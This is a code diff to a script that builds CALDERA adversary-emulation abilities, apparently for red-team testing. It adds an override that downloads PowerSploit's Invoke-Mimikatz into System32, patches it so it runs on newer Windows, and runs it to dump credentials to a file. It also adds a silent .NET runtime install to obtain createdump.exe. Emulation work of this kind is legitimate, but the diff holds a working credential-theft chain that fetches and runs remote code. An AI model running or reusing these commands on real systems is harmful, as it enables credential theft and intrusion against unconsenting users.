@@ -10,6 +10,13 @@ const CATEGORIES = {
 
 const VALID_TECHNIQUES = new Set(Object.values(CATEGORIES).flat())
 
+const EXCLUDE_ABILITY_IDS = new Set([
+  "bbc786e45aff314d33e60133f010f00c", // Dump LSASS.exe using lolbin rdrleakdiag.exe (doesn't produce files on Win11 22H2)
+  "7049e3ec-b822-4fdf-a4ac-18190f9b66d1", // Powerkatz (Staged) — deprecated on Win11
+  "baac2c6d-4652-4b7e-ab0a-f1bf246edd12", // Run PowerKatz — deprecated on Win11
+  "82dcefb5c3512d73bf2248cb0127c4ae", // Powershell Mimikatz — deprecated on Win11
+])
+
 async function fetchAbilities() {
   const res = await fetch(`${CALDERA_URL}/api/rest`, {
     method: "POST",
@@ -82,6 +89,43 @@ Start-Process -FilePath "ExternalPayloads\\python_setup.exe" -ArgumentList "/qui
   },
 }
 
+const CUSTOM_ABILITY_OVERRIDES = {
+  "7049e3ec-b822-4fdf-a4ac-18190f9b66d1": {
+    win_prereq: [
+      `$dest = "C:\\Windows\\System32\\invoke-mimi.ps1"`,
+      `if (-not (Test-Path $dest) -or (Get-Item $dest -ErrorAction SilentlyContinue).Length -eq 0) {`,
+      `  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`,
+      `  Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1" -OutFile $dest -UseBasicParsing`,
+      `  $f = Get-Item $dest -ErrorAction Stop`,
+      `  if ($f.Length -eq 0) { throw "invoke-mimi.ps1 downloaded but empty" }`,
+      `  Write-Host "DEPLOYED $($f.Length) bytes"`,
+      `} else {`,
+      `  Write-Host "ALREADY_PRESENT: $dest"`,
+      `}`,
+      `$old = '$UnsafeNativeMethods.GetMethod(''GetProcAddress'')'`,
+      `$new = '$UnsafeNativeMethods.GetMethod(''GetProcAddress'', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)'`,
+      `$content = Get-Content $dest -Raw`,
+      `$patched = $content.Replace($old, $new)`,
+      `Set-Content $dest $patched -Encoding UTF8`,
+      `Write-Host "PATCHED $dest"`,
+    ].join("; "),
+    command: `iex (Get-Content .\\invoke-mimi.ps1 -Raw);\nInvoke-Mimikatz -DumpCreds *>&1 | Out-File C:\\Windows\\Temp\\mimi-out.txt -Encoding UTF8;\nGet-Content C:\\Windows\\Temp\\mimi-out.txt`,
+  },
+}
+
+const BUILTIN_TOOL_PREREQS = {
+  "createdump.exe": {
+    win_check_path: "$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe",
+    win_steps: [
+      `$url = "https://download.visualstudio.microsoft.com/download/pr/a0832b5a-6900-442b-af79-6ffddddd6ba4/e2df0b25dd851ee0b38a86947dd0e42e/dotnet-runtime-5.0.17-win-x64.exe"`,
+      `$out = "$env:Temp\\dotnet-runtime-5.0.17.exe"`,
+      `Invoke-WebRequest -Uri $url -OutFile $out`,
+      `Start-Process -FilePath $out -ArgumentList "/install /quiet /norestart" -Wait`,
+      `Remove-Item $out -Force`,
+    ].join("; "),
+  },
+}
+
 function extractPayloadFilename(command) {
   const patterns = [
     { re: /ExternalPayloads[\\/](?:x64[\\/])?mimikatz\.exe/i, key: "mimikatz.exe" },
@@ -122,6 +166,41 @@ function enrichPayloads(ability) {
     ...ability,
     kali_prereq: kaliSteps,
     win_prereq: winSteps,
+  }
+}
+
+function enrichBuiltinToolPrereqs(ability) {
+  const cmds = ability.executors?.map(e => e.command || "").join("\n") || ""
+
+  for (const [tool, prereq] of Object.entries(BUILTIN_TOOL_PREREQS)) {
+    if (!cmds.includes(tool)) continue
+
+    const existingWin = ability.win_prereq ?? ""
+    if (existingWin) return ability
+
+    return {
+      ...ability,
+      kali_prereq: ability.kali_prereq || "",
+      win_prereq: `if (Test-Path "${prereq.win_check_path}") { Write-Host "ALREADY_PRESENT: ${prereq.win_check_path}" } else { ${prereq.win_steps} }`,
+    }
+  }
+  return ability
+}
+
+function enrichCustom(ability) {
+  const override = CUSTOM_ABILITY_OVERRIDES[ability.ability_id]
+  if (!override) return ability
+  const executors = ability.executors.map(e => {
+    if (e.name === "psh" && e.platform === "windows") {
+      return { ...e, command: override.command }
+    }
+    return e
+  })
+  return {
+    ...ability,
+    executors,
+    win_prereq: override.win_prereq || ability.win_prereq || "",
+    kali_prereq: ability.kali_prereq || "",
   }
 }
 
@@ -178,6 +257,8 @@ async function main() {
   const result = build()
 
   for (const ability of filtered) {
+    if (EXCLUDE_ABILITY_IDS.has(ability.ability_id)) continue
+
     const cat = ability.tactic
     const tid = ability.technique_id
     if (!result.techniques[cat]?.[tid]) continue
@@ -188,7 +269,7 @@ async function main() {
 
     const seen = result.techniques[cat][tid].abilities.map(a => a.ability_id)
     if (!seen.includes(ability.ability_id)) {
-      result.techniques[cat][tid].abilities.push(enrichPayloads(filterExecutors(ability)))
+      result.techniques[cat][tid].abilities.push(enrichCustom(enrichBuiltinToolPrereqs(enrichPayloads(filterExecutors(ability)))))
     }
   }
 
